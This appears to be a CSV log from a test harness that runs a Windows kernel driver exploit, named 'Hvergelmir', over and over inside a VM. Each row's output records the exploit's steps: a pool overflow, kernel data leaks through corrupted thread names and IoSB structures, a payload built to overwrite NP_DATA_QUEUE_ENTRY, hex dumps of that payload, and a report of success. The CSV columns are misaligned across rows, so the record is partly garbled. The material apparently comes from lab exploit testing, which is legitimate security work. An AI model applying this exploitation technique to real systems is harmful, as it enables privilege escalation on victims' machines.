timestamp,boot_index,run_index,runs_this_boot,vm_state_before,vm_state_after,remote_ready_before,outcome,exit_code,duration_seconds,stdout_tail,stderr_tail,note
2026-06-09T06:11:19+00:00,1,1,1,running,running,True,success,0,7.172,"HARNESS_EXIT_CODE=0
HARNESS_GUEST_SECONDS=7
","#< CLIXML
    [0000026E888A6B00]  7246704E0A100000  13007A51B150E1F7
    [0000026E888A6B10]  FFFF930E35E6BC08  FFFF930E35E6BC08
    [0000026E888A6B20]  0000000000000000  FFFF930E35F4AF30
    [0000026E888A6B30]  000000C000000000  00000000000000C0
    [0000026E888A6B40]  0000000D45504950  3939393939393939
    [0000026E888A6B50]  3939393939393939  3939393939393939
    [0000026E888A6B60]  3939393939393939  3939393939393939
    [0000026E888A6B70]  3939393939393939  3939393939393939
    [0000026E888A6B80]  3939393939393939  3939393939393939
    [0000026E888A6B90]  3939393939393939  3939393939393939
    [0000026E888A6BA0]  3939393939393939  3939393939393939
    [0000026E888A6BB0]  3939393939393939  3939393939393939
    [0000026E888A6BC0]  3939393939393939  3939393939393939
    [0000026E888A6BD0]  3939393939393939  3939393939393939
    [0000026E888A6BE0]  3939393939393939  3939393939393939
    [0000026E888A6BF0]  3939393939393939  3939393939393939
    [0000026E888A6C00]  7246704E0A100000  13007A51B150E0F7
    [0000026E888A6C10]  FFFF930E35208888  FFFF930E35208888
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000026E883B8E40]  7246704E0A100000  13007A51B150E1F7
    [0000026E883B8E50]  FFFF930E35E6BC08  FFFF930E35E6BC08
    [0000026E883B8E60]  0000026E883B53F0  FFFF930E35F4AF30
    [0000026E883B8E70]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000026E883B8E30]  0000000000000000  0000000000000000
    [0000026E883B8E40]  7246704E0A100000  13007A51B150E1F7
    [0000026E883B8E50]  FFFF930E35E6BC08  FFFF930E35E6BC08
    [0000026E883B8E60]  0000026E883B53F0  FFFF930E35F4AF30
    [0000026E883B8E70]  000000C000000001  00000000000000C0
    [0000026E883B8E80]  0000000D45504950  3939393939393939
    [0000026E883B8E90]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=21
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:19:03+00:00,1,2,2,running,running,True,success,0,7.343,True,True,11,6.0,1,11,11,1,"attempt 10 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 11 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 10 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=988 capture=0 iosbAttempt=10 pipeAttempt=0 pipeLeak=0
    [000001E91A7283A0]  42536F490A100000  13007A51B37396B7
    [000001E91A7283B0]  ECFFFADCE09F3607  0000000000000000
    [000001E91A7283C0]  0000000000000000  0000000000000000
    [000001E91A7283D0]  42536F490E0D0003  0000000000000000
    [000001E91A7283E0]  000000000000000C  FFFF930E35722E20
    [000001E91A7283F0]  00000000000003E8  6161616161616161
    [000001E91A728400]  6161616161616161  6161616161616161
    [000001E91A728410]  6161616161616161  6161616161616161
    [000001E91A728420]  6161616161616161  6161616161616161
    [000001E91A728430]  6161616161616161  6161616161616161
    [000001E91A728440]  6161616161616161  6161616161616161
    [000001E91A728450]  6161616161616161  6161616161616161
    [000001E91A728460]  6161616161616161  6161616161616161
    [000001E91A728470]  6161616161616161  6161616161616161
    [000001E91A728480]  6161616161616161  6161616161616161
    [000001E91A728490]  0000000000000000  0000000000000000
    [000001E91A7284A0]  7246704E0A100000  13007A51B37391B7
    [000001E91A7284B0]  FFFF930E36452508  FFFF930E36452508
    [000001E91A7284C0]  0000000000000000  FFFF930E35F2C350
    [000001E91A7284D0]  000000C000000000  00000000000000C0
    [000001E91A7284E0]  000003DC45504950  3939393939393939
    [000001E91A7284F0]  3939393939393939  3939393939393939
    [000001E91A728500]  3939393939393939  3939393939393939
    [000001E91A728510]  3939393939393939  3939393939393939
    [000001E91A728520]  3939393939393939  3939393939393939
    [000001E91A728530]  3939393939393939  3939393939393939
    [000001E91A728540]  3939393939393939  3939393939393939
    [000001E91A728550]  3939393939393939  3939393939393939
    [000001E91A728560]  3939393939393939  3939393939393939
    [000001E91A728570]  3939393939393939  3939393939393939
    [000001E91A728580]  3939393939393939  3939393939393939
    [000001E91A728590]  3939393939393939  3939393939393939
    [000001E91A7285A0]  7246704E0A100000  13007A51B37390B7
    [000001E91A7285B0]  FFFF930E35E7B748  FFFF930E35E7B748
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E91A728610]  7246704E0A100000  13007A51B37391B7
    [000001E91A728620]  FFFF930E36452508  FFFF930E36452508
    [000001E91A728630]  000001E91A320DE0  FFFF930E35F2C350
    [000001E91A728640]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E91A728600]  0000000000000000  0000000000000000
    [000001E91A728610]  7246704E0A100000  13007A51B37391B7
    [000001E91A728620]  FFFF930E36452508  FFFF930E36452508
    [000001E91A728630]  000001E91A320DE0  FFFF930E35F2C350
    [000001E91A728640]  000000C000000001  00000000000000C0
    [000001E91A728650]  000003DC45504950  3939393939393939
    [000001E91A728660]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=8
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:19:22+00:00,1,3,3,running,running,True,success,0,17.703,True,True,70,30.857,1,65,5,2,"oSB attempt 4 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 5 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 4 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=27 capture=1 iosbAttempt=4 pipeAttempt=0 pipeLeak=0
    [000002215ECD1B00]  42536F490A100000  13007A51B3005BB7
    [000002215ECD1B10]  ECFFFADCE0013B07  0000000000000000
    [000002215ECD1B20]  0000000000000000  0000000000000000
    [000002215ECD1B30]  42536F490E0D0003  0000000000000000
    [000002215ECD1B40]  000000000000000C  FFFF930E35722040
    [000002215ECD1B50]  00000000000003E8  6161616161616161
    [000002215ECD1B60]  6161616161616161  6161616161616161
    [000002215ECD1B70]  6161616161616161  6161616161616161
    [000002215ECD1B80]  6161616161616161  6161616161616161
    [000002215ECD1B90]  6161616161616161  6161616161616161
    [000002215ECD1BA0]  6161616161616161  6161616161616161
    [000002215ECD1BB0]  6161616161616161  6161616161616161
    [000002215ECD1BC0]  6161616161616161  6161616161616161
    [000002215ECD1BD0]  6161616161616161  6161616161616161
    [000002215ECD1BE0]  6161616161616161  6161616161616161
    [000002215ECD1BF0]  0000000000000000  0000000000000000
    [000002215ECD1C00]  7246704E0A100000  13007A51B3005AB7
    [000002215ECD1C10]  FFFF930E3522E448  FFFF930E3522E448
    [000002215ECD1C20]  0000000000000000  FFFF930E35F46850
    [000002215ECD1C30]  000000C000000000  00000000000000C0
    [000002215ECD1C40]  0000001B45504950  3939393939393939
    [000002215ECD1C50]  3939393939393939  3939393939393939
    [000002215ECD1C60]  3939393939393939  3939393939393939
    [000002215ECD1C70]  3939393939393939  3939393939393939
    [000002215ECD1C80]  3939393939393939  3939393939393939
    [000002215ECD1C90]  3939393939393939  3939393939393939
    [000002215ECD1CA0]  3939393939393939  3939393939393939
    [000002215ECD1CB0]  3939393939393939  3939393939393939
    [000002215ECD1CC0]  3939393939393939  3939393939393939
    [000002215ECD1CD0]  3939393939393939  3939393939393939
    [000002215ECD1CE0]  3939393939393939  3939393939393939
    [000002215ECD1CF0]  3939393939393939  3939393939393939
    [000002215ECD1D00]  7246704E0A100000  13007A51B300A5B7
    [000002215ECD1D10]  FFFF930E36349E28  FFFF930E36349E28
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000002215E6ABC30]  7246704E0A100000  13007A51B3005AB7
    [000002215E6ABC40]  FFFF930E3522E448  FFFF930E3522E448
    [000002215E6ABC50]  000002215E690BF0  FFFF930E35F46850
    [000002215E6ABC60]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000002215E6ABC20]  0000000000000000  0000000000000000
    [000002215E6ABC30]  7246704E0A100000  13007A51B3005AB7
    [000002215E6ABC40]  FFFF930E3522E448  FFFF930E3522E448
    [000002215E6ABC50]  000002215E690BF0  FFFF930E35F46850
    [000002215E6ABC60]  000000C000000001  00000000000000C0
    [000002215E6ABC70]  0000001B45504950  3939393939393939
    [000002215E6ABC80]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=20
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:19:37+00:00,1,4,4,running,running,True,success,0,14.063,True,True,124,30.653,1,65,2,3,"oSB attempt 1 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 2 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=404 NpFr=504 pipeBase=500 pipeIndex=16 capture=2 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [000001E2764A5830]  42536F490A100000  13007A51B3F2ABB7
    [000001E2764A5840]  ECFFFADCE1BCFB07  0000000000000000
    [000001E2764A5850]  0000000000000000  0000000000000000
    [000001E2764A5860]  42536F490E0D0003  0000000000000000
    [000001E2764A5870]  000000000000000C  FFFF930E345199C0
    [000001E2764A5880]  00000000000003E8  6161616161616161
    [000001E2764A5890]  6161616161616161  6161616161616161
    [000001E2764A58A0]  6161616161616161  6161616161616161
    [000001E2764A58B0]  6161616161616161  6161616161616161
    [000001E2764A58C0]  6161616161616161  6161616161616161
    [000001E2764A58D0]  6161616161616161  6161616161616161
    [000001E2764A58E0]  6161616161616161  6161616161616161
    [000001E2764A58F0]  6161616161616161  6161616161616161
    [000001E2764A5900]  6161616161616161  6161616161616161
    [000001E2764A5910]  6161616161616161  6161616161616161
    [000001E2764A5920]  0000000000000000  0000000000000000
    [000001E2764A5930]  7246704E0A100000  13007A51B3F2AAB7
    [000001E2764A5940]  FFFF930E36140E68  FFFF930E36140E68
    [000001E2764A5950]  0000000000000000  FFFF930E362E44C0
    [000001E2764A5960]  000000C000000000  00000000000000C0
    [000001E2764A5970]  0000001045504950  3939393939393939
    [000001E2764A5980]  3939393939393939  3939393939393939
    [000001E2764A5990]  3939393939393939  3939393939393939
    [000001E2764A59A0]  3939393939393939  3939393939393939
    [000001E2764A59B0]  3939393939393939  3939393939393939
    [000001E2764A59C0]  3939393939393939  3939393939393939
    [000001E2764A59D0]  3939393939393939  3939393939393939
    [000001E2764A59E0]  3939393939393939  3939393939393939
    [000001E2764A59F0]  3939393939393939  3939393939393939
    [000001E2764A5A00]  3939393939393939  3939393939393939
    [000001E2764A5A10]  3939393939393939  3939393939393939
    [000001E2764A5A20]  3939393939393939  3939393939393939
    [000001E2764A5A30]  7246704E0A100000  13007A51B3F2D5B7
    [000001E2764A5A40]  FFFF930E361417C8  FFFF930E361417C8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E2762C63E0]  7246704E0A100000  13007A51B3F2AAB7
    [000001E2762C63F0]  FFFF930E36140E68  FFFF930E36140E68
    [000001E2762C6400]  000001E275EA0770  FFFF930E362E44C0
    [000001E2762C6410]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E2762C63D0]  0000000000000000  0000000000000000
    [000001E2762C63E0]  7246704E0A100000  13007A51B3F2AAB7
    [000001E2762C63F0]  FFFF930E36140E68  FFFF930E36140E68
    [000001E2762C6400]  000001E275EA0770  FFFF930E362E44C0
    [000001E2762C6410]  000000C000000001  00000000000000C0
    [000001E2762C6420]  0000001045504950  3939393939393939
    [000001E2762C6430]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=13
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:27:54+00:00,1,1,1,running,running,True,success,0,3.266,True,True,1,1.0,1,1,1,1," [*] Starting Hvergelmir Exploit
 [+] Connected to driver successfully!

 [*] Pipe layout attempt 1/24

 [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=31 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [000001DC28036580]  42536F490A100000  1DED768E2C53091F
    [000001DC28036590]  E212DD01988409AF  0000000000000000
    [000001DC280365A0]  0000000000000000  0000000000000000
    [000001DC280365B0]  42536F490E0D0003  0000000000000000
    [000001DC280365C0]  000000000000000C  FFFFE3084DC5A0D0
    [000001DC280365D0]  00000000000003E8  6161616161616161
    [000001DC280365E0]  6161616161616161  6161616161616161
    [000001DC280365F0]  6161616161616161  6161616161616161
    [000001DC28036600]  6161616161616161  6161616161616161
    [000001DC28036610]  6161616161616161  6161616161616161
    [000001DC28036620]  6161616161616161  6161616161616161
    [000001DC28036630]  6161616161616161  6161616161616161
    [000001DC28036640]  6161616161616161  6161616161616161
    [000001DC28036650]  6161616161616161  6161616161616161
    [000001DC28036660]  6161616161616161  6161616161616161
    [000001DC28036670]  0000000000000000  0000000000000000
    [000001DC28036680]  7246704E0A100000  1DED768E2C530A1F
    [000001DC28036690]  FFFFE3084DB31508  FFFFE3084DB31508
    [000001DC280366A0]  0000000000000000  FFFFE30849DAF4A0
    [000001DC280366B0]  000000C000000000  00000000000000C0
    [000001DC280366C0]  0000001F45504950  3939393939393939
    [000001DC280366D0]  3939393939393939  3939393939393939
    [000001DC280366E0]  3939393939393939  3939393939393939
    [000001DC280366F0]  3939393939393939  3939393939393939
    [000001DC28036700]  3939393939393939  3939393939393939
    [000001DC28036710]  3939393939393939  3939393939393939
    [000001DC28036720]  3939393939393939  3939393939393939
    [000001DC28036730]  3939393939393939  3939393939393939
    [000001DC28036740]  3939393939393939  3939393939393939
    [000001DC28036750]  3939393939393939  3939393939393939
    [000001DC28036760]  3939393939393939  3939393939393939
    [000001DC28036770]  3939393939393939  3939393939393939
    [000001DC28036780]  7246704E0A100000  1DED768E2C530B1F
    [000001DC28036790]  FFFFE3084DB2AC08  FFFFE3084DB2AC08
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001DC280367F0]  7246704E0A100000  1DED768E2C530A1F
    [000001DC28036800]  FFFFE3084DB31508  FFFFE3084DB31508
    [000001DC28036810]  000001DC27ABFC10  FFFFE30849DAF4A0
    [000001DC28036820]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001DC280367E0]  0000000000000000  0000000000000000
    [000001DC280367F0]  7246704E0A100000  1DED768E2C530A1F
    [000001DC28036800]  FFFFE3084DB31508  FFFFE3084DB31508
    [000001DC28036810]  000001DC27ABFC10  FFFFE30849DAF4A0
    [000001DC28036820]  000000C000000001  00000000000000C0
    [000001DC28036830]  0000001F45504950  3939393939393939
    [000001DC28036840]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:05+00:00,1,2,2,running,running,True,success,0,9.578,True,True,67,32.06,1,65,2,2," IoSB attempt 1 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=8 capture=1 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
